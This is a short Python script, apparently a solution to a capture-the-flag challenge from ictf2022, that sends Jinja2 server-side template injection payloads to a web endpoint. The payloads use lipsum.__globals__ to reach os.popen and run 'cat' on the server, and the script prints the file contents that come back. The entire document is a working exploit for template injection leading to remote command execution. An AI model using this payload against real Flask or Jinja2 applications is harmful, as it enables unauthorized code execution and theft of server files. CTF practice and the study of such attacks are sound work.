import requests

URL = "https://sstigolf.ictf2022.iciaran.com"
requestURL = f"{URL}/ssti"

print("--ls files--")
query_params = {
    "query": "{{lipsum.__globals__.os.popen('cat an*').read()}}"
}
response = requests.get(requestURL, params=query_params)
print("requestURL:", requestURL, query_params)
print("response web:", response.text)

print("--cat files--")
query_params = {
    "query": "{{lipsum.__globals__.os.popen('cat *').read()}}"
}
response = requests.get(requestURL, params=query_params)
print("requestURL:", requestURL, query_params)
print("response web:", response.text)
